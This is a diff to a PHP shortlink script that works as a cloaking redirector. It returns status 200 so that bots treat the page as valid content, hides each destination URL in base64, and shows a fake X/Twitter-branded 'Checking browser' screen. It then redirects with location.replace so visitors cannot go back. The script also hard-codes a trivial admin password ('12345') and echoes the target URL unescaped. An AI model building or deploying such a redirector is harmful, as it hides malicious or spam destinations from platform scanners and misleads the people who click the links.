@@ -1,14 +1,19 @@
 <?php
 /**
- * SIMPLE SHORTLINK SYSTEM (Stealth Redirect Version)
- * Features: Client-Side Redirect (Status 200 OK), Base64 Obfuscation, Clean URLs, Modern Admin Panel.
+ * SIMPLE SHORTLINK SYSTEM (FIXED VERSION)
+ * Changes: Moved session_start to top, added ob_start, fixed form actions.
  */
 
+// --- 1. SESSION & BUFFERING WAJIB DI BARIS PERTAMA ---
+ob_start();
+session_start();
+error_reporting(0);
+
 // --- CONFIGURATION ---
-$admin_password   = "12345";                  // Admin Login Password
-$secret_path      = "panel";                  // Admin Access: domain.com/v/?panel
-$fallback_url     = "https://videqlix.live"; // Redirect destination if link is invalid/direct access
-$db_filename      = "database.json";          // JSON Database filename
+$admin_password   = "12345";                  // Password Admin
+$secret_path      = "panel";                  // Akses admin: domain.com/?panel
+$fallback_url     = "https://videqlix.live";  // Redirect jika link salah
+$db_filename      = "database.json";          // File database
 
 // =============================================================
 // PART 1: AUTO-INSTALLER (.HTACCESS)
@@ -31,9 +36,6 @@ if (!file_exists('.htaccess')) {
 // =============================================================
 // PART 2: SYSTEM LOGIC
 // =============================================================
-session_start();
-error_reporting(0);
-
 function getBaseUrl() {
     $protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
     $path = str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);
@@ -45,18 +47,14 @@ $links = json_decode(file_get_contents($db_filename), true);
 if (!is_array($links)) $links = [];
 
 // =============================================================
-// PART 3: VISITOR VIEW (STEALTH REDIRECT - TWITTER STYLE)
+// PART 3: VISITOR VIEW (STEALTH REDIRECT)
 // =============================================================
 if (isset($_GET['v']) && $_GET['v'] != $secret_path) {
     $code = $_GET['v'];
     
     if (isset($links[$code])) {
         $target_url = $links[$code]['url'];
-        
-        // 1. Kirim status 200 OK (Agar bot mengira ini konten valid)
         http_response_code(200);
-
-        // 2. Encode URL Target ke Base64 (Sembunyikan tujuan dari source code)
         $b64_url = base64_encode($target_url);
         ?>
         <!DOCTYPE html>
@@ -69,81 +67,33 @@ if (isset($_GET['v']) && $_GET['v'] != $secret_path) {
             <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
             <style>
                 * { margin:0; padding:0; box-sizing: border-box; }
-                body, html { height:100%; background:#000000; overflow:hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-                
-                .loader {
-                    position:fixed; inset:0; display:flex; flex-direction:column;
-                    justify-content:center; align-items:center; color:#fff;
-                    background:#000; transition:opacity .4s ease; z-index:9999;
-                }
-                
-                .spinner-box {
-                    position: relative;
-                    width: 60px; height: 60px;
-                    display: flex; justify-content: center; align-items: center;
-                    margin-bottom: 20px;
-                }
-
-                /* Lingkaran Berputar */
-                .spinner {
-                    position: absolute;
-                    width: 100%; height: 100%;
-                    border: 4px solid #333;
-                    border-top-color: #1d9bf0; /* Warna Biru Twitter/X */
-                    border-radius: 50%;
-                    animation: spin 1s linear infinite;
-                }
-
-                /* Logo X diam di tengah */
-                .logo-icon {
-                    font-size: 24px;
-                    color: #fff;
-                    z-index: 2;
-                }
-
+                body, html { height:100%; background:#000; overflow:hidden; font-family: sans-serif; }
+                .loader { position:fixed; inset:0; display:flex; flex-direction:column; justify-content:center; align-items:center; color:#fff; background:#000; z-index:9999; }
+                .spinner-box { position: relative; width: 60px; height: 60px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; }
+                .spinner { position: absolute; width: 100%; height: 100%; border: 4px solid #333; border-top-color: #1d9bf0; border-radius: 50%; animation: spin 1s linear infinite; }
+                .logo-icon { font-size: 24px; color: #fff; z-index: 2; }
                 @keyframes spin { to { transform:rotate(360deg); } }
-                
                 .text { font-size: 1rem; color: #71767b; font-weight: 500; }
-                .fade { opacity:0; pointer-events: none; }
+                .fade { opacity:0; pointer-events: none; transition:opacity .4s ease; }
             </style>
         </head>
         <body>
-
         <div class="loader" id="loader">
-            <div class="spinner-box">
-                <div class="spinner"></div>
-                <i class="fa-brands fa-x-twitter logo-icon"></i>
-            </div>
+            <div class="spinner-box"><div class="spinner"></div><i class="fa-brands fa-x-twitter logo-icon"></i></div>
             <div class="text">Checking browser Wait...</div>
         </div>
-
-        <div style="display:none;">
-            <img src="//sstatic1.histats.com/0.gif?4985217&101" alt="" border="0">
-        </div>
-
         <script>
-            // Ambil URL tujuan yang sudah di-enkripsi dari PHP
             var target = atob("<?php echo $b64_url; ?>");
-
             setTimeout(() => {
-                const loader = document.getElementById('loader');
-                loader.classList.add('fade');
-                
-                setTimeout(() => {
-                    // Gunakan replace agar user tidak bisa tekan Back
-                    window.location.replace(target);
-                }, 400); // Waktu untuk animasi fade out selesai
-                
-            }, 2000); // Durasi loading (2 detik cukup agar terlihat natural)
+                document.getElementById('loader').classList.add('fade');
+                setTimeout(() => { window.location.replace(target); }, 400);
+            }, 1000);
         </script>
-
         <noscript><meta http-equiv="refresh" content="0;url=<?php echo $target_url; ?>"></noscript>
-
         </body>
         </html>
         <?php
         exit();
-        
     } else {
         header("Location: " . $fallback_url);
         exit();
@@ -153,16 +103,34 @@ if (isset($_GET['v']) && $_GET['v'] != $secret_path) {
 // =============================================================
 // PART 4: ADMIN PANEL (MODERN UI)
 // =============================================================
+// Perbaikan: Kita pastikan pengecekan parameter query lebih ketat
 elseif (isset($_GET[$secret_path])) {
     $msg = "";
+    
+    // Logic POST Handling
     if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-        if (isset($_POST['auth_pass'])) {
-            if ($_POST['auth_pass'] === $admin_password) $_SESSION['admin_logged'] = true;
-            else $msg = "Invalid Password!";
-        }
-        if (isset($_POST['logout'])) { session_destroy(); header("Refresh:0"); exit(); }
         
-        if (isset($_SESSION['admin_logged'])) {
+        // 1. Login
+        if (isset($_POST['auth_pass'])) {
+            if ($_POST['auth_pass'] === $admin_password) {
+                $_SESSION['admin_logged'] = true;
+                // Refresh halaman agar session terbaca bersih
+                header("Location: ?".$secret_path);
+                exit();
+            } else {
+                $msg = "Invalid Password!";
+            }
+        }
+
+        // 2. Logout
+        if (isset($_POST['logout'])) { 
+            session_destroy(); 
+            header("Location: ?".$secret_path); 
+            exit(); 
+        }
+        
+        // 3. Create & Delete Link (Hanya jika login)
+        if (isset($_SESSION['admin_logged']) && $_SESSION['admin_logged'] === true) {
             if (isset($_POST['long_url'])) {
                 $url = trim($_POST['long_url']);
                 if (filter_var($url, FILTER_VALIDATE_URL)) {
@@ -175,6 +143,8 @@ elseif (isset($_GET[$secret_path])) {
             if (isset($_POST['delete_id'])) {
                 unset($links[$_POST['delete_id']]);
                 file_put_contents($db_filename, json_encode($links));
+                header("Location: ?".$secret_path); // Refresh setelah delete
+                exit();
             }
         }
     }
@@ -231,21 +201,26 @@ elseif (isset($_GET[$secret_path])) {
         <div id="toast"><i class="fa-solid fa-check-circle" style="color: #4ade80;"></i> Link Copied!</div>
 
         <div class="container">
-            <?php if (!isset($_SESSION['admin_logged'])): ?>
+            <?php if (!isset($_SESSION['admin_logged']) || $_SESSION['admin_logged'] !== true): ?>
                 <div class="login-card">
                     <div style="font-size: 3rem; color: var(--accent); margin-bottom: 15px;"><i class="fa-solid fa-shield-halved"></i></div>
                     <h2 style="margin-top: 0; color: #fff;">Admin Access</h2>
                     <p style="color: #888; margin-bottom: 20px;">Enter security key to continue.</p>
-                    <form method="POST">
+                    
+                    <form method="POST" action="?<?php echo $secret_path; ?>">
                         <input type="password" name="auth_pass" class="login-input" placeholder="Password..." autofocus required>
                         <button class="btn-primary" style="width:100%">LOGIN</button>
                     </form>
+                    
                     <?php if($msg) echo "<p style='color:#ef4444; margin-top:15px; font-size:0.9rem;'>$msg</p>"; ?>
                 </div>
             <?php else: ?>
                 <div class="header">
                     <h2><i class="fa-solid fa-rocket" style="color: var(--accent); margin-right: 8px;"></i>Shortlink</h2>
-                    <form method="POST" style="margin:0"><input type="hidden" name="logout"><button class="logout-btn"><i class="fa-solid fa-right-from-bracket"></i> Logout</button></form>
+                    <form method="POST" action="?<?php echo $secret_path; ?>" style="margin:0">
+                        <input type="hidden" name="logout">
+                        <button class="logout-btn"><i class="fa-solid fa-right-from-bracket"></i> Logout</button>
+                    </form>
                 </div>
 
                 <?php if(isset($generated_link)): ?>
@@ -256,7 +231,7 @@ elseif (isset($_GET[$secret_path])) {
                 <?php endif; ?>
 
                 <div class="action-box">
-                    <form method="POST" style="margin:0">
+                    <form method="POST" action="?<?php echo $secret_path; ?>" style="margin:0">
                         <label style="display:block; color:#aaa; font-size:0.85rem; margin-bottom:8px;">Paste Original URL:</label>
                         <div class="input-group">
                             <input type="text" name="long_url" class="main-input" placeholder="https://..." required autocomplete="off">
@@ -278,7 +253,7 @@ elseif (isset($_GET[$secret_path])) {
                             </div>
                             <div class="actions">
                                 <button class="btn-icon btn-copy" onclick="copyText('<?php echo $full_short; ?>')"><i class="fa-regular fa-copy"></i></button>
-                                <form method="POST" style="margin:0" onsubmit="return confirm('Delete this link?')">
+                                <form method="POST" action="?<?php echo $secret_path; ?>" style="margin:0" onsubmit="return confirm('Delete this link?')">
                                     <input type="hidden" name="delete_id" value="<?php echo $id; ?>">
                                     <button class="btn-icon btn-del"><i class="fa-solid fa-trash"></i></button>
                                 </form>
